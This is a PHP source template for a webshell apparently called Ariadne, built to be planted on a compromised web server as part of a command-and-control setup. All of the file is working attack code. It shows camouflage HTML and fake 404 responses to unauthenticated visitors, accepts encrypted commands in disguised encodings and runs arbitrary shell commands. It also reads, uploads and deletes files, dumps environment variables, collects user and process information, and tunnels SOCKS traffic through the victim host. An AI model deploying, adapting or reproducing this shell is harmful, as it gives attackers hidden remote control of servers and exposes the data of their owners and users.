<?php
// Ariadne PHP webshell template
// Tokens are replaced at build time.

$ARIADNE_UUID = '%UUID%';
$ARIADNE_AUTH_METHOD = '%AUTH_METHOD%';
$ARIADNE_AUTH_NAME = '%AUTH_NAME%';
$ARIADNE_AUTH_VALUE = '%AUTH_VALUE%';
$ARIADNE_ENCODING = '%ENCODING%';
$ARIADNE_DEFORMED_ALPHABET = '%DEFORMED_ALPHABET%';
$ARIADNE_STANDARD_ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
$ARIADNE_ENCRYPTION = '%ENCRYPTION%';
$ARIADNE_AES_KEY = '%AES_KEY%';
$ARIADNE_REQUEST_TEMPLATE = '%REQUEST_TEMPLATE%';
$ARIADNE_REQUEST_PARAM = '%REQUEST_PARAM_NAME%';
$ARIADNE_CAMOUFLAGE_HTML = '%CAMOUFLAGE_HTML%';
$ARIADNE_RESPONSE_STATUS = %RESPONSE_STATUS_CODE%;
$ARIADNE_RESPONSE_CT = '%RESPONSE_CONTENT_TYPE%';
$ARIADNE_ENABLE_SOCKS = %ENABLE_SOCKS%;
$ARIADNE_ENABLE_P2P_HTTP = %ENABLE_P2P_HTTP%;
$ARIADNE_ENABLE_P2P_TCP = %ENABLE_P2P_TCP%;
$ARIADNE_TCP_PORT = %TCP_PORT%;
$ARIADNE_DEBUG = %DEBUG%;

// --- Session state for SOCKS tunnels ---
if (session_status() === PHP_SESSION_NONE) {
    @session_start();
}

// --- P2P message queue (stored in temp file keyed by UUID) ---
$p2p_queue_file = sys_get_temp_dir() . DIRECTORY_SEPARATOR . '.ariadne_p2p_' . md5($ARIADNE_UUID);

// =============================================================================
// ENCODING / ENCRYPTION
// =============================================================================

function ariadne_encode($data) {
    global $ARIADNE_ENCODING, $ARIADNE_DEFORMED_ALPHABET, $ARIADNE_STANDARD_ALPHABET;

    if ($ARIADNE_ENCODING === 'deformed_base64') {
        $standard = base64_encode($data);
        return strtr($standard, $ARIADNE_STANDARD_ALPHABET, $ARIADNE_DEFORMED_ALPHABET);
    } elseif ($ARIADNE_ENCODING === 'standard_base64') {
        return base64_encode($data);
    } elseif ($ARIADNE_ENCODING === 'hex') {
        return bin2hex($data);
    }
    return base64_encode($data);
}

function ariadne_decode($encoded) {
    global $ARIADNE_ENCODING, $ARIADNE_DEFORMED_ALPHABET, $ARIADNE_STANDARD_ALPHABET;

    if ($ARIADNE_ENCODING === 'deformed_base64') {
        $standard = strtr($encoded, $ARIADNE_DEFORMED_ALPHABET, $ARIADNE_STANDARD_ALPHABET);
        return base64_decode($standard);
    } elseif ($ARIADNE_ENCODING === 'standard_base64') {
        return base64_decode($encoded);
    } elseif ($ARIADNE_ENCODING === 'hex') {
        return hex2bin($encoded);
    }
    return base64_decode($encoded);
}

function ariadne_encrypt($plaintext) {
    global $ARIADNE_ENCRYPTION, $ARIADNE_AES_KEY;

    if ($ARIADNE_ENCRYPTION !== 'aes256_cbc' || empty($ARIADNE_AES_KEY)) {
        return $plaintext;
    }

    $key = base64_decode($ARIADNE_AES_KEY);
    $iv = openssl_random_pseudo_bytes(16);
    $ciphertext = openssl_encrypt($plaintext, 'aes-256-cbc', $key, OPENSSL_RAW_DATA, $iv);
    $blob = $iv . $ciphertext;
    $hmac = hash_hmac('sha256', $blob, $key, true);
    return $blob . $hmac;
}

function ariadne_decrypt($blob) {
    global $ARIADNE_ENCRYPTION, $ARIADNE_AES_KEY;

    if ($ARIADNE_ENCRYPTION !== 'aes256_cbc' || empty($ARIADNE_AES_KEY)) {
        return $blob;
    }

    $key = base64_decode($ARIADNE_AES_KEY);
    $hmac_received = substr($blob, -32);
    $iv_and_ct = substr($blob, 0, -32);
    $hmac_computed = hash_hmac('sha256', $iv_and_ct, $key, true);

    if (!hash_equals($hmac_computed, $hmac_received)) {
        return false;
    }

    $iv = substr($iv_and_ct, 0, 16);
    $ciphertext = substr($iv_and_ct, 16);
    return openssl_decrypt($ciphertext, 'aes-256-cbc', $key, OPENSSL_RAW_DATA, $iv);
}

// =============================================================================
// AUTHENTICATION
// =============================================================================

function ariadne_authenticate() {
    global $ARIADNE_AUTH_METHOD, $ARIADNE_AUTH_NAME, $ARIADNE_AUTH_VALUE;

    $value = '';
    if ($ARIADNE_AUTH_METHOD === 'cookie') {
        $value = isset($_COOKIE[$ARIADNE_AUTH_NAME]) ? $_COOKIE[$ARIADNE_AUTH_NAME] : '';
    } elseif ($ARIADNE_AUTH_METHOD === 'header') {
        $header_key = 'HTTP_' . strtoupper(str_replace('-', '_', $ARIADNE_AUTH_NAME));
        $value = isset($_SERVER[$header_key]) ? $_SERVER[$header_key] : '';
    } elseif ($ARIADNE_AUTH_METHOD === 'parameter') {
        $value = isset($_POST[$ARIADNE_AUTH_NAME]) ? $_POST[$ARIADNE_AUTH_NAME] : '';
        if (empty($value)) {
            $value = isset($_GET[$ARIADNE_AUTH_NAME]) ? $_GET[$ARIADNE_AUTH_NAME] : '';
        }
    }

    return hash_equals($ARIADNE_AUTH_VALUE, $value);
}

// =============================================================================
// REQUEST BODY EXTRACTION
// =============================================================================

function ariadne_extract_payload() {
    global $ARIADNE_REQUEST_TEMPLATE, $ARIADNE_REQUEST_PARAM;

    $body = file_get_contents('php://input');

    if ($ARIADNE_REQUEST_TEMPLATE === 'form_post') {
        return isset($_POST[$ARIADNE_REQUEST_PARAM]) ? $_POST[$ARIADNE_REQUEST_PARAM] : '';
    } elseif ($ARIADNE_REQUEST_TEMPLATE === 'json_api') {
        $json = json_decode($body, true);
        return isset($json[$ARIADNE_REQUEST_PARAM]) ? $json[$ARIADNE_REQUEST_PARAM] : '';
    } elseif ($ARIADNE_REQUEST_TEMPLATE === 'image_data') {
        $val = isset($_POST[$ARIADNE_REQUEST_PARAM]) ? $_POST[$ARIADNE_REQUEST_PARAM] : '';
        $prefix = 'data:image/png;base64,';
        if (strpos($val, $prefix) === 0) {
            return substr($val, strlen($prefix));
        }
        return $val;
    } elseif ($ARIADNE_REQUEST_TEMPLATE === 'xml_soap') {
        $xml = @simplexml_load_string($body);
        if ($xml !== false) {
            $ns = $xml->getNamespaces(true);
            $soapBody = $xml->children(isset($ns['soap']) ? $ns['soap'] : '')->Body;
            if ($soapBody && isset($soapBody->{$ARIADNE_REQUEST_PARAM})) {
                return (string)$soapBody->{$ARIADNE_REQUEST_PARAM};
            }
        }
        return '';
    }

    return $body;
}

// =============================================================================
// COMMAND HANDLERS
// =============================================================================

function cmd_checkin($task_id) {
    $hostname = @gethostname();
    $os = PHP_OS;
    $user = function_exists('posix_getpwuid') ? posix_getpwuid(posix_geteuid())['name'] : get_current_user();
    $domain = @gethostbyaddr('127.0.0.1');
    if ($domain === false || $domain === '127.0.0.1') $domain = '';
    $pid = getmypid();
    $arch = php_uname('m');
    $cwd = getcwd();
    $ips = '';
    if (function_exists('shell_exec')) {
        $raw = @shell_exec('hostname -I 2>/dev/null || ipconfig 2>nul');
        if ($raw) {
            $ips = trim(preg_replace('/\s+/', ',', trim($raw)));
        }
    }

    return "0|$task_id|$hostname|$os|$user|$domain|$pid|$arch|$cwd|$ips";
}

function cmd_shell($task_id, $command) {
    $output = '';
    $return_code = -1;

    if (function_exists('proc_open')) {
        $descriptors = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w'],
        ];
        $is_windows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
        $shell = $is_windows ? 'cmd.exe /c ' . $command : '/bin/sh -c ' . escapeshellarg($command);
        $proc = proc_open($shell, $descriptors, $pipes);
        if (is_resource($proc)) {
            fclose($pipes[0]);
            $stdout = stream_get_contents($pipes[1]);
            $stderr = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            $return_code = proc_close($proc);
            $output = $stdout;
            if (!empty($stderr)) {
                $output .= "\n" . $stderr;
            }
        }
    } elseif (function_exists('shell_exec')) {
        $output = @shell_exec($command . ' 2>&1');
        $return_code = 0;
    } elseif (function_exists('exec')) {
        @exec($command . ' 2>&1', $out_lines, $return_code);
        $output = implode("\n", $out_lines);
    } elseif (function_exists('system')) {
        ob_start();
        @system($command . ' 2>&1', $return_code);
        $output = ob_get_clean();
    } elseif (function_exists('passthru')) {
        ob_start();
        @passthru($command . ' 2>&1', $return_code);
        $output = ob_get_clean();
    } else {
        return "1|$task_id|No shell execution function available";
    }

    return "0|$task_id|" . rtrim($output, "\r\n");
}

function cmd_ls($task_id, $path) {
    if (!is_dir($path)) {
        return "1|$task_id|Not a directory: $path";
    }

    $entries = @scandir($path);
    if ($entries === false) {
        return "1|$task_id|Cannot read directory: $path";
    }

    $result = [];
    foreach ($entries as $entry) {
        if ($entry === '.' || $entry === '..') continue;
        $full = $path . DIRECTORY_SEPARATOR . $entry;
        $is_file = is_file($full);
        $size = $is_file ? @filesize($full) : 0;
        $perms = @substr(sprintf('%o', fileperms($full)), -4);
        $mtime = @filemtime($full);
        $result[] = [
            'name' => $entry,
            'is_file' => $is_file,
            'size' => $size,
            'permissions' => $perms ? $perms : '0000',
            'modify_time' => $mtime ? date('Y-m-d H:i:s', $mtime) : '',
        ];
    }

    return "0|$task_id|" . json_encode([
        'host' => gethostname(),
        'parent_path' => realpath($path),
        'files' => $result,
    ]);
}

function cmd_cd($task_id, $path) {
    if (@chdir($path)) {
        return "0|$task_id|" . getcwd();
    }
    return "1|$task_id|Cannot change directory to: $path";
}

function cmd_pwd($task_id) {
    return "0|$task_id|" . getcwd();
}

[% if 'download' in commands %]
function cmd_download($task_id, $filepath) {
    if (!file_exists($filepath)) {
        return "1|$task_id|File not found: $filepath";
    }
    if (!is_readable($filepath)) {
        return "1|$task_id|File not readable: $filepath";
    }

    $contents = @file_get_contents($filepath);
    if ($contents === false) {
        return "1|$task_id|Failed to read file: $filepath";
    }

    $size = strlen($contents);
    $encoded = base64_encode($contents);
    $filename = basename($filepath);

    return "0|$task_id|" . json_encode([
        'filename' => $filename,
        'filepath' => realpath($filepath),
        'size' => $size,
        'data' => $encoded,
    ]);
}
[% endif %]

[% if 'upload' in commands %]
function cmd_upload($task_id, $remote_path, $b64_content) {
    $dir = dirname($remote_path);
    if (!is_dir($dir)) {
        @mkdir($dir, 0755, true);
    }

    $content = base64_decode($b64_content);
    $written = @file_put_contents($remote_path, $content);

    if ($written === false) {
        return "1|$task_id|Failed to write file: $remote_path";
    }

    return "0|$task_id|Uploaded $written bytes to $remote_path";
}
[% endif %]

[% if 'rm' in commands %]
function cmd_rm($task_id, $path) {
    if (!file_exists($path)) {
        return "1|$task_id|Path not found: $path";
    }

    if (is_dir($path)) {
        $success = ariadne_rmdir_recursive($path);
    } else {
        $success = @unlink($path);
    }

    if ($success) {
        return "0|$task_id|Removed: $path";
    }
    return "1|$task_id|Failed to remove: $path";
}
[% endif %]

[% if 'cat' in commands %]
function cmd_cat($task_id, $filepath) {
    if (!file_exists($filepath)) {
        return "1|$task_id|File not found: $filepath";
    }
    if (!is_readable($filepath)) {
        return "1|$task_id|File not readable: $filepath";
    }

    $contents = @file_get_contents($filepath);
    if ($contents === false) {
        return "1|$task_id|Failed to read file: $filepath";
    }

    return "0|$task_id|$contents";
}
[% endif %]

[% if 'mkdir' in commands %]
function cmd_mkdir_create($task_id, $path) {
    if (is_dir($path)) {
        return "0|$task_id|Directory already exists: $path";
    }

    if (@mkdir($path, 0755, true)) {
        return "0|$task_id|Created directory: $path";
    }
    return "1|$task_id|Failed to create directory: $path";
}
[% endif %]

[% if 'cp' in commands %]
function cmd_cp($task_id, $src, $dst) {
    if (!file_exists($src)) {
        return "1|$task_id|Source not found: $src";
    }

    if (is_dir($src)) {
        $success = ariadne_copy_recursive($src, $dst);
        if ($success) {
            return "0|$task_id|Copied: $src -> $dst";
        }
        return "1|$task_id|Failed to copy directory: $src -> $dst";
    } else {
        if (@copy($src, $dst)) {
            return "0|$task_id|Copied: $src -> $dst";
        }
        return "1|$task_id|Failed to copy file: $src -> $dst";
    }
}

function ariadne_copy_recursive($src, $dst) {
    if (!is_dir($dst)) {
        @mkdir($dst, 0755, true);
    }
    $entries = @scandir($src);
    if ($entries === false) return false;
    foreach ($entries as $entry) {
        if ($entry === '.' || $entry === '..') continue;
        $srcPath = $src . DIRECTORY_SEPARATOR . $entry;
        $dstPath = $dst . DIRECTORY_SEPARATOR . $entry;
        if (is_dir($srcPath)) {
            ariadne_copy_recursive($srcPath, $dstPath);
        } else {
            @copy($srcPath, $dstPath);
        }
    }
    return true;
}
[% endif %]

[% if 'mv' in commands %]
function cmd_mv($task_id, $src, $dst) {
    if (!file_exists($src)) {
        return "1|$task_id|Source not found: $src";
    }

    if (@rename($src, $dst)) {
        return "0|$task_id|Moved: $src -> $dst";
    }
    return "1|$task_id|Failed to move: $src -> $dst";
}
[% endif %]

[% if 'rm' in commands %]
function ariadne_rmdir_recursive($dir) {
    $entries = @scandir($dir);
    if ($entries === false) return false;
    foreach ($entries as $entry) {
        if ($entry === '.' || $entry === '..') continue;
        $full = $dir . DIRECTORY_SEPARATOR . $entry;
        if (is_dir($full)) {
            ariadne_rmdir_recursive($full);
        } else {
            @unlink($full);
        }
    }
    return @rmdir($dir);
}
[% endif %]

// =============================================================================
// RECON COMMAND HANDLERS
// =============================================================================

[% if 'env' in commands %]
function cmd_env($task_id) {
    $env = getenv();
    $lines = [];
    foreach ($env as $k => $v) {
        $lines[] = "$k=$v";
    }
    return "0|$task_id|" . implode("\n", $lines);
}
[% endif %]

[% if 'whoami' in commands %]
function cmd_whoami($task_id) {
    $info = '';
    $is_windows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';

    if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
        $pw = posix_getpwuid(posix_geteuid());
        $info .= "User: " . $pw['name'] . "\n";
        $info .= "UID: " . posix_geteuid() . "\n";
        $info .= "GID: " . posix_getegid() . "\n";
    } else {
        $info .= "User: " . get_current_user() . "\n";
    }

    if (function_exists('shell_exec')) {
        if ($is_windows) {
            $detail = @shell_exec('whoami /all 2>&1');
        } else {
            $detail = @shell_exec('id 2>&1');
        }
        if ($detail) {
            $info .= trim($detail);
        }
    }

    return "0|$task_id|" . rtrim($info, "\r\n");
}
[% endif %]

[% if 'ps' in commands %]
function cmd_ps($task_id) {
    $is_windows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';

    if (function_exists('shell_exec')) {
        if ($is_windows) {
            $output = @shell_exec('tasklist /fo csv /nh 2>&1');
        } else {
            $output = @shell_exec('ps aux 2>&1');
        }
        if ($output !== null) {
            return "0|$task_id|" . rtrim($output, "\r\n");
        }
    }

    if (function_exists('exec')) {
        $cmd = $is_windows ? 'tasklist /fo csv /nh' : 'ps aux';
        @exec($cmd . ' 2>&1', $out_lines, $rc);
        return "0|$task_id|" . implode("\n", $out_lines);
    }

    return "1|$task_id|No shell execution function available for process listing";
}
[% endif %]

// =============================================================================
// SOCKS TUNNEL HANDLERS
// =============================================================================

function tunnel_connect($mark, $data) {
    if (!isset($_SESSION['ariadne_tunnels'])) {
        $_SESSION['ariadne_tunnels'] = [];
    }

    $target = base64_decode($data);
    $parts = explode(':', $target, 2);
    if (count($parts) !== 2) {
        return "1|Connection target invalid";
    }

    $ip = $parts[0];
    $port = intval($parts[1]);

    $socket = @fsockopen($ip, $port, $errno, $errstr, 10);
    if (!$socket) {
        return "1|Connection failed: $errstr ($errno)";
    }

    stream_set_blocking($socket, false);
    stream_set_timeout($socket, 0, 100000);

    $_SESSION['ariadne_tunnels'][$mark] = [
        'socket' => $socket,
        'read_buf' => '',
        'write_buf' => '',
    ];

    return "0|Connected";
}

function tunnel_forward($mark, $data) {
    if (!isset($_SESSION['ariadne_tunnels'][$mark])) {
        return "1|No tunnel session: $mark";
    }

    $raw = base64_decode($data);
    $socket = $_SESSION['ariadne_tunnels'][$mark]['socket'];

    if (!is_resource($socket)) {
        unset($_SESSION['ariadne_tunnels'][$mark]);
        return "1|Tunnel closed";
    }

    $written = @fwrite($socket, $raw);
    if ($written === false) {
        @fclose($socket);
        unset($_SESSION['ariadne_tunnels'][$mark]);
        return "1|Write failed";
    }

    return "0|" . $written;
}

function tunnel_read($mark) {
    if (!isset($_SESSION['ariadne_tunnels'][$mark])) {
        return "1|No tunnel session: $mark";
    }

    $socket = $_SESSION['ariadne_tunnels'][$mark]['socket'];
    if (!is_resource($socket)) {
        unset($_SESSION['ariadne_tunnels'][$mark]);
        return "1|Tunnel closed";
    }

    $data = '';
    while (($chunk = @fread($socket, 8192)) !== false && $chunk !== '') {
        $data .= $chunk;
        if (strlen($data) >= 524288) break;
    }

    if (feof($socket)) {
        @fclose($socket);
        unset($_SESSION['ariadne_tunnels'][$mark]);
        $encoded = base64_encode($data);
        return "0|$encoded";
    }

    $encoded = base64_encode($data);
    return "0|$encoded";
}

function tunnel_disconnect($mark) {
    if (isset($_SESSION['ariadne_tunnels'][$mark])) {
        $socket = $_SESSION['ariadne_tunnels'][$mark]['socket'];
        if (is_resource($socket)) {
            @fclose($socket);
        }
        unset($_SESSION['ariadne_tunnels'][$mark]);
    }
    return "0|Disconnected";
}

// =============================================================================
// P2P MESSAGE QUEUE
// =============================================================================

function p2p_queue_push($message) {
    global $p2p_queue_file;
    @file_put_contents($p2p_queue_file, $message . "\n", FILE_APPEND | LOCK_EX);
}

function p2p_queue_drain() {
    global $p2p_queue_file;
    if (!file_exists($p2p_queue_file)) {
        return '';
    }
    $data = @file_get_contents($p2p_queue_file);
    @file_put_contents($p2p_queue_file, '', LOCK_EX);
    return trim($data);
}

// =============================================================================
// MAIN DISPATCH
// =============================================================================

if (!ariadne_authenticate()) {
    http_response_code($ARIADNE_RESPONSE_STATUS === 200 ? 404 : $ARIADNE_RESPONSE_STATUS);
    echo $ARIADNE_CAMOUFLAGE_HTML;
    exit;
}

$encoded_payload = ariadne_extract_payload();
if (empty($encoded_payload)) {
    http_response_code($ARIADNE_RESPONSE_STATUS);
    header("Content-Type: $ARIADNE_RESPONSE_CT");
    echo $ARIADNE_CAMOUFLAGE_HTML;
    exit;
}

$raw = ariadne_decode($encoded_payload);
$plaintext = ariadne_decrypt($raw);

if ($plaintext === false) {
    http_response_code(500);
    exit;
}

$parts = explode('|', $plaintext);
$action = isset($parts[0]) ? $parts[0] : '';
$task_id = isset($parts[1]) ? $parts[1] : '';

$response = '';

switch ($action) {
    case 'checkin':
        $response = cmd_checkin($task_id);
        break;

    case 'shell':
        $command = isset($parts[2]) ? implode('|', array_slice($parts, 2)) : '';
        $response = cmd_shell($task_id, $command);
        break;

    case 'ls':
        $path = isset($parts[2]) ? $parts[2] : '.';
        $response = cmd_ls($task_id, $path);
        break;

    case 'cd':
        $path = isset($parts[2]) ? $parts[2] : '.';
        $response = cmd_cd($task_id, $path);
        break;

    case 'pwd':
        $response = cmd_pwd($task_id);
        break;

[% if 'download' in commands %]
    case 'download':
        $filepath = isset($parts[2]) ? $parts[2] : '';
        $response = cmd_download($task_id, $filepath);
        break;
[% endif %]

[% if 'upload' in commands %]
    case 'upload':
        $remote_path = isset($parts[2]) ? $parts[2] : '';
        $b64_content = isset($parts[3]) ? $parts[3] : '';
        $response = cmd_upload($task_id, $remote_path, $b64_content);
        break;
[% endif %]

[% if 'rm' in commands %]
    case 'rm':
        $path = isset($parts[2]) ? $parts[2] : '';
        $response = cmd_rm($task_id, $path);
        break;
[% endif %]

[% if 'cat' in commands %]
    case 'cat':
        $filepath = isset($parts[2]) ? $parts[2] : '';
        $response = cmd_cat($task_id, $filepath);
        break;
[% endif %]

[% if 'mkdir' in commands %]
    case 'mkdir':
        $path = isset($parts[2]) ? $parts[2] : '';
        $response = cmd_mkdir_create($task_id, $path);
        break;
[% endif %]

[% if 'cp' in commands %]
    case 'cp':
        $src = isset($parts[2]) ? $parts[2] : '';
        $dst = isset($parts[3]) ? $parts[3] : '';
        $response = cmd_cp($task_id, $src, $dst);
        break;
[% endif %]

[% if 'mv' in commands %]
    case 'mv':
        $src = isset($parts[2]) ? $parts[2] : '';
        $dst = isset($parts[3]) ? $parts[3] : '';
        $response = cmd_mv($task_id, $src, $dst);
        break;
[% endif %]

[% if 'env' in commands %]
    case 'env':
        $response = cmd_env($task_id);
        break;
[% endif %]

[% if 'whoami' in commands %]
    case 'whoami':
        $response = cmd_whoami($task_id);
        break;
[% endif %]

[% if 'ps' in commands %]
    case 'ps':
        $response = cmd_ps($task_id);
        break;
[% endif %]

    case 'tunnel':
        if ($ARIADNE_ENABLE_SOCKS) {
            $mark = isset($parts[1]) ? $parts[1] : '';
            $tunnel_cmd = isset($parts[2]) ? $parts[2] : '';
            $tunnel_data = isset($parts[3]) ? $parts[3] : '';
            switch ($tunnel_cmd) {
                case 'CONNECT':
                    $response = tunnel_connect($mark, $tunnel_data);
                    break;
                case 'FORWARD':
                    $response = tunnel_forward($mark, $tunnel_data);
                    break;
                case 'READ':
                    $response = tunnel_read($mark);
                    break;
                case 'DISCONNECT':
                    $response = tunnel_disconnect($mark);
                    break;
                default:
                    $response = "1|Unknown tunnel command: $tunnel_cmd";
            }
        } else {
            $response = "1|SOCKS tunneling not enabled";
        }
        break;

    case 'poll':
    case 'poll_p2p':
        $p2p_data = '';
        if ($ARIADNE_ENABLE_P2P_HTTP && $action === 'poll_p2p') {
            $p2p_data = p2p_queue_drain();
            if (empty($p2p_data)) {
                $hostname = @gethostname();
                $os = PHP_OS;
                $user = function_exists('posix_getpwuid') ? posix_getpwuid(posix_geteuid())['name'] : get_current_user();
                $domain = @gethostbyaddr('127.0.0.1');
                if ($domain === false || $domain === '127.0.0.1') $domain = '';
                $pid = getmypid();
                $arch = php_uname('m');
                $p2p_data = "checkin|$ARIADNE_UUID|$hostname|$os|$user|$domain|$pid|$arch";
            }
        }
        $response = "0|poll|$p2p_data";
        break;

    default:
        $response = "1|$task_id|Unknown action: $action";
        break;
}

$encrypted = ariadne_encrypt($response);
$encoded_response = ariadne_encode($encrypted);

http_response_code($ARIADNE_RESPONSE_STATUS);
header("Content-Type: $ARIADNE_RESPONSE_CT");
echo '<span id="r">' . $encoded_response . '</span>';
?>
